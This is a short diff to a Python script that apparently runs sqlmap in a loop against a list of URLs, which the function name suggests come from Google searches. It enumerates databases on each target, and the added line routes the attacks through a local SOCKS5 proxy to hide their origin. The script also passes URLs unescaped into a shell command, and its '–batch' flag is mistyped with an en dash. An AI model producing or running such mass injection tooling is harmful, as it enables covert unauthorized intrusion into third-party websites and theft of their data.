@@ -10,7 +10,7 @@ def sqlmqp_google():
 
     for i in urls:
         os.system(
-            'sqlmap -u {} –batch --thread 10 --dbs --beep --level 3'.format(i))
+            'sqlmap -u {} –batch --thread 10 --dbs --beep --level 3 --proxy socks5://127.0.0.1:9090'.format(i))
 
 
 if __name__ == "__main__":
